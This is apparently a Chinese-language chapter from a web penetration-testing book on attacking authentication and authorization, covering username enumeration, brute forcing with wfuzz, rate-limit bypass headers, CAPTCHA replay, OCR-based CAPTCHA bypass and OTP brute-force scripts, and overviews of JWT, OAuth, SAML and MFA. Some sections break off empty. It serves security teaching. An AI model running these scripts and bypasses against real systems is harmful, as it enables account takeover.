# 第 7 章 身份验证与授权攻击

## 7.1 引言

本章可能是本书中最长的一章。篇幅之所以长，是因为我们将讨论涉及功能、协议、技术和绕过方法的广泛内容。身份验证和授权机制是现代任何 Web 应用程序的支柱。它们验证用户身份并授予对敏感资源的访问权限。

由于其关键性，应用程序在身份验证方面集成了许多安全控制措施，包括账户锁定机制、验证码（CAPTCHA）、“忘记密码”功能、多因素认证等。这些保护措施有时会因具体实现而被攻击者滥用。同样，多种攻击也可用于针对应用程序的授权机制。常见攻击包括强制浏览、不安全的直接对象引用（IDOR）等，这些通常会导致敏感数据泄露以及水平和垂直权限提升。

然而，在深入探讨与身份验证和授权相关的漏洞之前，必须明确两者之间的区别。尽管它们经常互换使用，但各自承担不同的角色：

- **身份验证（Authentication）**：指验证用户身份的过程，通常通过用户名、电子邮件地址、密码或唯一令牌/PIN 码等凭据进行。
- **授权（Authorization）**：一旦身份验证成功且用户身份得到确认，下一步就是确定用户可以访问哪些资源。这个决策过程即称为授权。

现代 Web 应用程序依赖多种身份验证和授权机制。其中许多构成了单点登录（SSO）的基础，SSO 允许用户使用一组凭据访问多个应用程序。以下是一些常见的协议：

- **JSON Web Tokens（JWT）**：JSON Web Token 用于处理身份验证和在应用程序之间安全交换数据。它们既可用于身份验证，也可用于授权。
- **OAuth**：OAuth 是一种协议，主要用于第三方应用程序在不共享密码的情况下授权访问用户资源。OAuth 的主要用例是执行授权；但与其他协议结合时也可用于身份验证。
- **安全断言标记语言（SAML）**：SAML 允许在线服务交换身份验证和授权数据。其核心是一个 SSO 协议，允许用户在登录一次后访问多个应用程序。虽然其主要作用是提供身份验证，但也可传递用户属性用于授权目的。

在本章中，我们将深入探讨这些机制的工作原理，以及针对每种身份验证和授权方案的常见攻击。

## 7.2 针对身份验证的攻击

在本节中，我们将根据安全测试中遇到的实际场景，讨论针对身份验证机制、安全控制及其潜在绕过的常见漏洞。

### 7.2.1 用户名枚举

如前所述，应用程序采用用户名和密码等机制来验证用户身份。用户名和密码字段必须与数据库中存储的内容匹配，用户才能正确认证。Web 应用程序有时会因设计决策或配置错误而透露用户名/电子邮件地址是否存在于数据库中。这可能泄露用户存在的信息，因此剩下的工作就是确定密码。值得注意的是，当提供正确/不正确的用户名时，应用程序可能表现出不同的行为。以下是一些常见行为的示例：

**表 7.1 常见行为示例**

| 用户名存在 | 用户名不存在 |
|------------|--------------|
| 错误消息提示密码输入错误 | 错误消息提示用户名或电子邮件不存在 |
| 设置新的 Cookie | Cookie 被删除 |
| HTML 响应内容有修改 | HTML 响应保持不变 |
| 服务器处理请求耗时更长 | 响应请求的平均时间大致相同 |

#### 7.2.1.1 通过错误消息进行用户名枚举

这是现实世界中最常见的用户名枚举技术。应用程序会对有效用户名和无效用户名显示不同的错误消息。据此，可以使用常见用户名列表来识别有效用户名。

#### 7.2.1.2 通过时序攻击进行用户名枚举

在许多情况下，数据库中已存在用户的处理时间可能更长。这种延长时间可能是应用程序设计导致的。例如，如果数据库中不存在该用户，应用程序可能只返回一条错误消息。然而，当用户存在时，应用程序会执行额外操作，如从数据库中检索用户详细信息、获取其密码并验证是否匹配。这种响应时间的差异可能允许攻击者根据应用程序的响应时延进行用户枚举。

为了说明，考虑一个无论提供有效还是无效用户名都返回“无效用户名或密码”错误消息的应用程序。但在内部，当输入有效用户名时，应用程序会执行额外操作，从而导致响应时间差异。

为了确定应用程序处理请求所需时间，我们可以使用以下 curl 命令来处理无效用户名“tmgm”：

**命令：**
```bash
time curl -X POST -d "username=tmgm&password=ad" http://dev-portal.local:5000/
```

**图 7.2 通过计时函数进行用户名枚举**

从截图中可以明显看出，处理有效用户名时应用程序花费了更长的时间：

- `~0.010s`：表示当提供无效用户名（如“tmgm”或“demo”）时，应用程序大约需要 9 到 10 毫秒来响应。
- `~0.060s`：表示当提供有效用户名（如“admin”）时，应用程序需要 60 毫秒来响应。

在此必须提到，其他功能（包括用户注册页面和密码重置页面）也可能存在类似行为。

### 7.2.3 暴力破解与字典攻击

一旦识别出有效用户名，下一步就是尝试猜测密码。暴力破解攻击涉及尝试所有可能的字符组合来破解密码。简言之，弱密码（即使包含特殊字符）也可能相当容易被猜中。然而，随着密码复杂度增加，暴力破解几乎变得不可行。

虽然较长的密码也可能被破解（尤其是字典单词），字典攻击正是针对此类弱点。更有效的方法是使用常用密码列表，许多此类列表由研究人员分析数百次数据库泄露事件后编制而成。

其中一种资源是 SecLists 的“Common-Credentials”[https://github.com/danielmiessler/SecLists/tree/master/Passwords/Common-Credentials]，它提供了最常用的密码列表，还涵盖了广泛的内容管理系统（CMS）和软件包的默认凭据列表。

值得注意的是，暴力破解攻击本身噪声较大，通常容易被检测到。它们位列 Web 应用防火墙（WAF）、安全信息和事件管理（SIEM）及其他安全控制的主要检测规则之中。

### 7.2.4 暴力破解 HTTP 基本认证

HTTP 基本认证是最早的 Web 认证形式之一，至今仍相当流行。有多种方法可以暴力破解 HTTP 基本认证，如 OWASP ZAP、Wfuzz 等。例如，使用 Wfuzz 暴力破解基本认证，可以采用以下有效载荷：

**命令**
```bash
wfuzz --hc 401 -w password.txt --basic admin:FUZZ "http://tmgm-portal.local:5050/admin.php"
```

### 7.2.5 攻击基于表单的认证

攻击基于表单的认证通常涉及与暴力破解类似的方法。多种工具（如 Wfuzz 和 OWASP ZAP）可用于此目的。我们在前面的章节中已经介绍过这些技术，这里不再赘述。

#### 7.2.5.1 凭据填充（Credential Stuffing）

一旦攻击者获得用户名或电子邮件地址，他们通常会转向暗网和泄露数据库，搜索相关联的泄露密码。这种利用是由用户在不同网站重复使用相同密码的常见倾向推动的。因此，在一次泄露中泄露的密码可能在别处同样脆弱。

Haveibeenpwned.com 等工具允许用户检查其账户详细信息是否在过去的泄露事件中遭到入侵，还可以识别泄露来源。值得注意的是，即使密码以加密或哈希形式存储，攻击者也具备字典攻击、暴力破解和预计算表（通常称为“彩虹表”）等方法来破解它们。

#### 7.2.5.2 使用 HTTP 动词篡改绕过认证

除了暴力破解，HTTP 动词篡改也可用于绕过身份验证机制。HTTP 包含多种动词，允许客户端以不同方式与服务器交互。一些常见动词包括：

- **GET**：从指定资源检索数据。
- **HEAD**：类似于 GET，但只请求头部。这意味着服务器不会在响应中返回实际内容。
- **POST**：向服务器发送数据以创建或更新资源。
- **PUT**：用于更新现有资源或在服务器上创建新资源。
- **DELETE**：从服务器删除指定资源。

某些 Web 应用程序和服务器可能配置不当，导致易受非标准或较少使用的 HTTP 动词攻击。例如，虽然 Web 应用程序可能阻止 POST 请求，但可能未配置处理 PUT 或 DELETE 请求，因此这种行为可能导致认证绕过。

为了更深入地理解此攻击，让我们分析一个易受动词篡改影响的应用程序的行为，重点针对名为“secure.php”的资源。

**请求（GET）**
```
GET /secure.php HTTP/1.1
Host: admin-tmgm.local
...
```

**请求（PUT）**

## 7.3 攻击账户锁定策略

为遏制暴力破解攻击而采用的安全机制之一是账户锁定策略。该策略规定，在连续多次输入无效密码后，用户账户应被锁定。锁定持续时间因组织而异：有些组织可能选择每 30 分钟解锁一次，而另一些（如银行应用程序）则要求用户联系支持热线并验证凭据后才能解锁。更糟的是，用户可能因支持人员不在岗而排队等待，尤其是在周末。

账户锁定策略存在安全困境。如果过于宽松，可能在用户被阻止前允许过多尝试；如果过于严格，则可能导致拒绝服务（DoS）。

值得注意的是，即使解锁时间较短（如几分钟），也可以自动化每隔几分钟提交无效密码尝试，使用户长时间保持锁定。在最近的一次渗透测试中遇到过类似场景，账户在连续 6 次密码尝试错误后被锁定，并在 5 分钟后自动解锁。因此，编写了一个脚本，每 5 分钟执行 6 次无效尝试。这种行为允许我们将用户锁定在应用程序之外很长时间。

## 7.4 绕过速率限制机制

应用程序用于防止密码猜测攻击的另一种常见机制是速率限制，即根据失败登录尝试次数阻止 IP 地址。在一次安全测试中遇到了类似场景，IP 地址在 10 次不成功尝试后被封锁。

**图 7.7 基于 IP 的速率限制机制**

然而，通过将 `X-Forwarded-For` 头设置为 `127.0.0.1`，我们发现应用程序被误导，认为请求来自其本地网络，从而允许其通过。

**图 7.8 使用 X-Forwarded-For 头绕过控制**

根据应用程序的功能，其他几个头也可用于达到类似效果。

**示例**
```
X-Originating-IP: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
```

同样，你也可以尝试使用双重 `X-Forwarded-For` 头或类似头。服务器或 WAF 可能因存在两个此类头而混淆，导致处理不当。建议将 IP 地址替换为私有 IP 子网，甚至是应用程序枚举期间可能无意中暴露的合法内部路径。

### 7.4.1 绕过速率限制的其他方法

- **使用多个 IP 地址**：达到阈值后轮换 IP 地址。虽然某些 WAF 使用 IP 信誉系统识别和阻止可疑尝试，但这可以通过使用私有代理绕过。类似地，AWS Lambda 和 Azure Functions 等云函数也可用于轮换 IP 地址。
- **更改路径**：某些配置欠佳的 Web 应用程序可能无法有效处理端点路径变化。这种疏忽有时可被利用来绕过速率限制。改变字符大小写或使用某些编码也可能规避此类速率限制机制。例如，对于标准端点 `/api/v4/endpoint`，可测试的变体包括：

**示例**
```
/api/v4/Endpoint
/api/v4/endpoint%00
/api/v4/endpoint%01
/api/v4/endpoint%0A
```

- **使用不同端点**：某些应用程序的速率限制可能在不同平台或端点之间应用不一致。例如，Web 版本可能有速率限制，但其移动对应版本可能没有。
- **账户轮换**：面对速率限制时，可考虑登录有效账户，然后尝试无效账户，并在两者之间轮换。这种方法有助于混淆系统并绕过 IP 限制。

## 7.5 绕过 CAPTCHA

CAPTCHA（全自动区分计算机和人类的公开图灵测试）的主要目的是区分人类和机器人。随着时间的推移，由于光学字符识别（OCR）软件和机器学习技术的进步，CAPTCHA 已从纯文本演变为包含图片和音频挑战。

CAPTCHA 的基本原理植根于挑战-响应机制，用户面临诸如识别图像中的物体或转录扭曲文本的挑战，必须正确响应以证明其人类身份。

CAPTCHA 是防止密码猜测攻击或暴力破解攻击最有效的方法之一。常见的实现策略是，在连续多次登录失败后，要求用户解决 CAPTCHA 才能继续，从而阻止自动化攻击并增加额外安全层。

关于绕过 CAPTCHA，细节大多决定成败。由于 CAPTCHA 的实现各不相同，我们来看看实际中常见的规避技术。

### 7.5.1 重放攻击

在最近的一次渗透测试中，应用程序实现了 CAPTCHA，但发现容易受到重放攻击。本质上，通过重放先前捕获的请求，恶意用户可以绕过 CAPTCHA 的保护，使用自动化脚本发送多个请求。此漏洞存在的原因是 CAPTCHA 验证未与会话或令牌唯一绑定。换言之，一旦攻击者捕获了有效的 CAPTCHA 解决方案，它可以无限重用，无需为后续每个请求解决新的 CAPTCHA 挑战。

**图 7.9 易受重放攻击的 CAPTCHA**

重现漏洞的步骤如下：

步骤 1：发起新请求，确保验证 CAPTCHA。  
步骤 2：使用代理工具（如 Burp Suite）捕获请求，并将其转发至 Intruder。  
步骤 3：多次重发请求，注意应用程序始终接受先前输入的 CAPTCHA 值，而不是要求新的 CAPTCHA。

**图 7.10 尽管有 CAPTCHA，仍发送自动化请求**

以下是可以用来测试 CAPTCHA 重放攻击的类似技术：

- **空值方法**：尝试发送空的 CAPTCHA 参数。
- **更改请求类型**：尝试将请求类型从 GET 改为 POST 或反之，从请求中省略 CAPTCHA。
- **更改请求体**：尝试将请求体从 POST 改为 JSON 或反之。

#### 7.5.1.1 OCR 引擎绕过

在另一次评估中，注册页面上存在 CAPTCHA。检查后发现文本通过 OCR 引擎很容易识别。最初，使用 Google 的 Tesseract OCR 引擎验证了此行为。通过多次刷新页面生成 CAPTCHA，并使用相同方法成功转换为文本。

重现此行为的步骤如下：

步骤 1：从注册网页下载 CAPTCHA。

**图 7.12 易受攻击的 CAPTCHA**

步骤 2：接下来，使用 Google Tesseract OCR 引擎的封装，将包含 CAPTCHA 值的 png 图像转换为文本。使用以下命令：

**命令**

每次生成新的 CAPTCHA 时，都需要下载、通过 Google Tesseract OCR 引擎处理，然后在发送前输入 HTTP 请求。为了大规模自动化和复制此过程，使用 Selenium 开发了 Python 脚本。该脚本能够提取 CAPTCHA 值并将其注入原始请求，从而有效绕过 CAPTCHA 安全机制。

**CAPTCHA 绕过 POC**
```python
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
import warnings
import time
import base64
from PIL import Image
from io import BytesIO
from selenium.webdriver.common.keys import Keys
import urllib.request
from PIL import Image
import pytesseract
import argparse
import cv2
import os

def captcha_bypass():
    warnings.filterwarnings("ignore", category=DeprecationWarning)
    options = Options()
    options.add_experimental_option('excludeSwitches', ['enable-logging'])
    # options.headless = True
    options.add_argument("Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.4896.60 Safari/537.36")
    driver = webdriver.Chrome('chromedriver', chrome_options=options)
    driver.get("redacted")
    html = driver.page_source
    print("[*] Saving Captcha Image")
    img = driver.find_element_by_xpath('/html/body/form/div[2]/div/div/div[5]/div[1]/div[1]/div/img')
    src = img.get_attribute('src')
    urllib.request.urlretrieve(src, "captcha.png")
    print("[*] Converting Captcha image into text . . . . . .")
    # load the image and convert it to grayscale
    image = cv2.imread("captcha.png")
    gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)
    # write the grayscale image to disk as a temporary file so we can
    # apply OCR to it
    filename = "{}.png".format(os.getpid())
    cv2.imwrite(filename, gray)
    # load the image as a PIL/Pillow image, apply OCR, and then delete
    # the temporary file
    text = pytesseract.image_to_string(Image.open(filename))
    os.remove(filename)
    print("Captcha Text is: "+ text)
    print("[*] submitting the form")
    driver.find_element_by_id("txt_SubmitCaptchaInput").send_keys(text)
    driver.find_element_by_id("emailAddress").send_keys("user@test.com")
    driver.find_element_by_id("validateBtn").click()
    print("\n\t\t-CAPTCHA BYPASS ")

for _ in range(3):
    time.sleep(4)
    captcha_bypass()
```

## 7.6 使用 OCR 绕过动态 CAPTCHA 生成

在另一次评估中，观察到类似的 CAPTCHA。通过 Google Tesseract OCR 引擎，能够将图像转换为文本。但存在一个问题：CAPTCHA 图像无法直接下载，因为应用程序在每个请求中动态生成新图像。换言之，该网站采用动态 CAPTCHA 生成，不断创建新图像以阻止传统下载方法。

**图 7.14 动态生成的 CAPTCHA**

为了解决此挑战，使用 Selenium 设计了一个方案。该过程包括拍摄全页截图，然后从截图中精确裁剪 CAPTCHA 区域，随后通过 OCR 处理图像。

**步骤 1：捕获截图并裁剪 CAPTCHA**

## 7.7 滥用忘记密码功能

每个身份验证机制都包含允许用户重置密码的选项，这合乎逻辑，因为用户往往会忘记密码。在许多密码重置功能实现中，用户需要点击通常通过电子邮件收到的链接，该链接会触发密码重置。在安全性方面，存在几个问题：

- **可预测的令牌/链接**：某些重置链接使用易于预测的令牌，例如用户名的 MD5 或 SHA1 哈希，使其容易受到猜测攻击。
- **密码链接可重复使用**：理想情况下，重置链接应为一次性使用。如果可重复使用，即使原始用户已使用，获得该链接的攻击者仍可重置密码。
- **随机令牌跨用户重用**：令牌应针对每个用户和每个请求唯一。漏洞可能允许同一令牌对不同用户有效，从而存在未授权访问风险。

## 7.8 通过 Host 标头注入进行密码重置链接投毒

让我们讨论一个涉及“密码重置投毒”的复杂场景，这是一种攻击者利用网站漏洞操纵重置链接生成，将用户引导至攻击者控制域的技术。此技术可用于窃取重置用户密码所需的秘密令牌，并可能入侵其账户。

在一次安全评估中，我们遇到了一个密码重置功能易受 Host 标头注入攻击的应用程序。通过 Host 标头注入，攻击者可以在 HTTP 请求的 Host 标头中恶意注入主机名。这种操纵允许攻击者控制生成的密码重置链接，将其指向攻击者的恶意主机。

## 7.9 攻击授权

在本节中，我们将讨论针对授权的各种攻击，如缺乏访问控制、不安全的直接对象引用（IDOR）和 Web 参数篡改。未能保护受限资源通常会导致以下类型的权限提升之一：

- **水平权限提升**：当已认证用户能够访问另一个具有相同权限用户的数据/功能时发生。
- **垂直权限提升**：当已认证用户能够访问具有更高权限用户（如管理员、超级管理员）的数据/功能时发生，具体取决于应用程序的功能。

### 7.9.1 缺乏访问控制

访问控制是 Web 应用程序的基本组成部分。它提供授权机制，确保只有授权用户才能访问特定资源并执行指定操作。缺乏健壮的访问控制意味着用户可能未经授权访问敏感端点和数据。当开发人员未能保护某些页面，导致它们无需身份验证和授权即可访问时，就会出现此漏洞。OWASP 传统上将此类漏洞归类为“失效的访问控制”。

### 7.9.2 不安全的直接对象引用（IDOR）

IDOR 确实可归类为访问控制问题，但它在更细粒度层面运作。它通常涉及操纵参数、URL 和 Cookie 等输入方法。当攻击者无需必要授权即可直接引用对象（如文件、数据库记录或其他资源）时，此漏洞就会显现。

当 Web 应用程序未能正确验证这些输入参数，允许攻击者调整它们并访问未授权对象时，这种引用就变得不安全（因此称为“不安全的直接对象引用”）。

IDOR 漏洞经常在缺乏集中授权检查的应用程序中发现，要求开发人员手动集成授权检查。在具有多个角色且每个角色拥有一组复杂权限和功能访问权限的复杂环境中，此问题更加严重。

## 7.9.4 攻击 JWT

JSON Web Token（JWT）被广泛认为是基于会话身份验证的替代方案。它常用于在 Web 服务之间传递身份验证信息。JWT 的一个显著特征是消息完整性，能够验证发送方和接收方的身份，即客户端和服务器都可以验证消息。

为了说明其用途，考虑一个移动银行应用程序的场景。应用程序不使用可能引入安全漏洞并因在内存中维护会话令牌而导致服务器资源消耗的会话，而是采用 JWT。当用户登录应用程序时，服务器发布一个嵌入一组声明的 JWT，用于标识和授权用户。这些声明可能包括用户 ID、角色或其他非敏感属性。然后此令牌负责监督和验证后续用户请求，简化认证过程。这种方法不仅减轻了服务器资源负担，也符合 RESTful API 的无状态特性。

JWT 由三个以点（`.`）分隔的组件组成，如下所示：

- **头部（Header）**：包含令牌类型（通常为 JWT）和签名算法。
- **有效载荷（Payload）**：包含实际传输的数据内容。
- **签名（Signature）**：保护令牌的完整性。

**图 7.33 JWT 结构**

为生成签名，头部和有效载荷都需要使用 base64 URL 编码进行编码。编码后，两部分用点（`.`）连接。

### 7.9.4.1 JWT 安全注意事项

在处理 JWT 时，理解各种安全影响至关重要。以下是一些关键考虑因素：

- **签名密钥**：JWT 的签名使用密钥。如果选择弱密钥，则容易受到暴力破解攻击。
- **XSS 漏洞**：与其他会话令牌类似，如果应用程序存在 XSS 漏洞，JWT 可能被盗。一种缓解措施是通过受 `HTTP Only` 标志保护的 Cookie 传输 JWT。然而，这引入了新风险；由于跨域请求中 Cookie 的自动提交，JWT 将容易受到 CSRF 攻击。
- **存储漏洞**：将 JWT 存储在本地或会话存储中，如果应用程序存在 XSS 漏洞，则可能被盗。
- **过期**：永不过期的令牌为攻击者提供了较长的利用窗口。如果他们设法窃取此类令牌，可以无限期滥用。
- **编码与加密**：JWT 默认采用 base64 编码，而非加密。开发人员常犯的一个错误是在未加密的情况下将敏感数据存储在 JWT 中。

## 7.10 None 算法

## 7.11 攻击 OAuth 2.0

OAuth 2.0 是 Web 应用程序的授权框架；然而，它也用于身份验证目的。本质上，它允许第三方应用程序从 Web 应用程序获取有限信息，而无需用户名/密码等凭据。

例如，考虑一个租赁网站，需要验证用户的银行对账单以确保其符合负担能力标准。一种方法是要求用户上传银行对账单。然而，此方法有缺点，因为用户可能篡改对账单。更安全可靠的替代方案是使用 OAuth。通过 OAuth，租赁机构可以直接从银行获取银行对账单信息，而无需用户手动上传任何文件。要理解 OAuth 如何实现这一点，必须了解其关键概念。

### OAuth 2.0 关键组件

- **资源所有者（Resource Owner）**：使用租赁网站的人，拥有将访问其银行对账单的银行账户。
- **客户端（Client）**：租赁网站，想要查看银行对账单以验证负担能力。
- **资源服务器（Resource Server）**：银行的系统，存储银行对账单和其他用户数据。
- **授权服务器（Authorization Server）**：负责认证资源所有者的服务器，即银行的登录页面，检查并验证账户持有人详细信息。
- **重定向 URI（Redirect URI）**：在您决定是否授予银行共享对账单权限后，被重定向回的租赁网站上的特定页面。
- **访问令牌（Access Token）**：银行在您授予权限后发放的票据。此密钥允许租赁网站直接从银行获取您的银行对账单，而无需每次都询问您。
- **刷新令牌（Refresh Token）**：如果原始访问令牌过期，银行提供此辅助“密钥”。它允许租赁网站获取新的访问令牌，而无需再次获得您的许可。

### OAuth 作用域

OAuth 作用域指所需的权限/特权；在我们的场景中，将如下所示：

- **读取（Read）**：允许租赁网站查看您的银行对账单而不做任何更改。
- **写入（Write）**：在此场景中不太可能，此权限将允许租赁网站修改银行数据。
- **访问联系人（Access Contacts）**：授予网站访问您在银行账户中保存的联系人。与仅检查银行对账单不直接相关。

### OAuth 流程

OAuth 2.0 允许第三方应用程序访问用户数据或功能的一小部分。该框架提供多种授权流程以适应不同应用场景。其中，我们将讨论“授权码许可”和“隐式许可”。

- **授权码许可（Authorization Code Grant）**：在此流程中，第三方应用程序将用户重定向到授权服务器。用户授予权限，作为回报，收到授权码。客户端随后将此代码交换为访问令牌，从而允许访问用户资源。
- **隐式许可（Implicit Grant）**：这是授权码许可的简化版本。在此，用户授权后，访问令牌直接提供给客户端，无需中间步骤接收授权码。

了解了关键概念，我们来讨论涉及滥用 `redirect_uri` 的 OAuth 攻击场景。如果授权服务器未能验证 `redirect_uri`，就容易受到开放重定向和访问令牌劫持等漏洞的影响。

## 7.12 攻击 SAML

SAML 是一种基于 XML 的标准，用于在不同实体之间提供身份验证和授权。在 SAML 上下文中，这些实体称为身份提供者（IdP）和服务提供者（SP）。SAML 通过一组凭据简化用户对多个服务的访问，此功能称为单点登录（SSO）。

### SAML 关键组件

- **用户代理（User Agent）**：通常指用户的 Web 浏览器。
- **身份提供者（Identity Provider，IdP）**：IdP 充当负责认证用户的中央权威机构，安全存储和管理用户凭据及相关认证信息。
- **服务提供者（Service Provider，SP）**：SP 指用户想要访问的应用程序或服务。
- **SAML 断言（SAML Assertion）**：SAML 的关键元素，这是一个包含必要用户信息、时间戳和认证上下文的 XML 文档。它由 IdP 数字签名以确保完整性和真实性。

在实践中，配置 SAML 时，SP 和 IdP 之间建立信任关系。这意味着用户必须先通过 IdP 认证，然后才能访问 SP 提供的服务。一旦用户被 IdP 认证，它会生成 SAML 断言，发送给应用程序。由于 SP 信任 IdP，它允许用户访问应用程序，无需再次登录。这种便利性称为单点登录（SSO），用户在 IdP 初次认证后可无缝访问各种应用程序。

## 7.13 攻击多因素认证

多因素认证（MFA）作为抵御身份盗窃的强大手段，在现代应用程序中越来越受到重视。如果实施得当，它可以解决大部分身份盗窃问题。Google 与纽约大学和圣地亚哥大学等知名机构合作进行的一项长达一年的综合研究揭示了一些惊人的发现。具体来说，基于 SMS 的双因素认证（2FA）有效阻止了 100% 的自动化机器人攻击、96% 的网络钓鱼尝试和 76% 的定向威胁。相比之下，基于设备的 2FA 表现更出色，阻止了 100% 的机器人攻击、99% 的大规模钓鱼事件和 90% 的定向攻击 [https://security.googleblog.com/2019/05/new-research-how-effective-is-basic.html]。

MFA（通常称为多因素认证或双因素认证）通常结合两种不同的因素：“你知道的”（如密码或 PIN）、“你拥有的”（如一次性 PIN 或安全令牌）和/或“你是什么”（通常为生物特征，如指纹或面部扫描）。

然而，与许多安全机制一样，MFA 的有效性在很大程度上取决于其实现细节。以下是绕过 2FA 的一些常见方法：

### 7.13.1 多因素认证绕过

- **暴力破解**：如果 OTP（一次性密码）长度短且无过期时间，攻击者可以尝试所有可能组合直至找到正确的一个。
- **较少使用的接口**：某些接口（如移动应用或 API）可能不具备与主应用程序相同的严格 2FA 保护，特别是当安全措施在不同平台上的实现不一致时。
- **强制浏览**：某些页面可能在无需 MFA 甚至无需身份验证的情况下即可访问。这已在本章前面的“缺乏访问控制”部分（7.9.1）中演示过。
- **可预测/可重用的令牌**：如果令牌可预测或可重用，攻击者可能猜测或重用以绕过 MFA。
- **参数篡改**：攻击者可能操纵应用程序参数以绕过 2FA。此漏洞已在“Web 参数篡改”部分（7.9.3）中演示过。

### 7.13.2 MFA 绕过场景：OTP 绕过

考虑一个需要 OTP 完成认证过程的场景。登录应用程序后，OTP 发送到用户注册的电子邮件地址。

进一步检查发现，OTP 长度为五位数字，且没有过期时间。此外，应用程序未强制执行任何速率限制或账户锁定机制。据此，我们可以确定此 OTP 的总可能排列数为 100,000（范围从 00000 到 99999）。

鉴于这些漏洞，自动化猜测 OTP 是可行的。

**图 7.57 OTP 验证**

**图 7.58 通过电子邮件收到的 OTP**

以下脚本尝试通过系统发送 OTP 值并检查成功登录来暴力破解 OTP。逻辑还触发 OTP 重新发送，遍历所有 100,000 个可能的 OTP 排列。

**POC**
```python
import requests

url = "http://portal.redseclabs.com"
headers = {
    "Cookie": "session=eyJ1c2VybmFtZSI6ImFkbWluIn0.ZRt-Ug.krmeKBbbbaVBmLE7fKeL8vYDqVo",
}

def brute(otp):
    payload = {
        "otp": otp
    }
    response = requests.post(url + "/otp", headers=headers, data=payload, allow_redirects=False)
    if response.status_code == 302:
        print("[+] OTP Found! ", otp)
        print("Response cookies:", response.cookies.values())
        return True

print("[+] Generating OTPs")
for i in range(100):
    requests.post(url + "/resend_otp", headers=headers)

for i in range(100000):
    otp = str(i).zfill(5)
    if brute(otp):
        break
```

**图 7.59 执行中的脚本尝试绕过 OTP**

在渗透测试中遇到过类似场景，但略有不同。虽然 OTP 设计为在 5 分钟后过期，然后生成新的，但发现先前的 OTP 仍然有效且可用。这意味着在任何给定时间，有两个有效的 OTP。因此，猜测正确 OTP 所需的总排列数实际上减少了一半。为了利用此漏洞，设计了两个暴力破解脚本：第一个从 00000 到 10000 递增猜测，第二个反向进行，从 10000 递减到 00000。

## 7.14 Web 缓存欺骗

- **人工 CAPTCHA 解决 API**：研究旨在雇用人类解决 CAPTCHA 的 API。选择并使用此类 API 来评估其在解决各种 CAPTCHA 类型时的有效性。
- **二阶 IDOR**：深入研究二阶 IDOR，检查其机制及相关风险。
- **批量赋值漏洞**：研究批量赋值漏洞背后的原理。分析其与 Web 参数篡改的关系，并确定是否可以归为一类还是应单独处理。
- **OAuth2 redirect_uri 绕过**：研究绕过 redirect_uri 和白名单的各种方法。
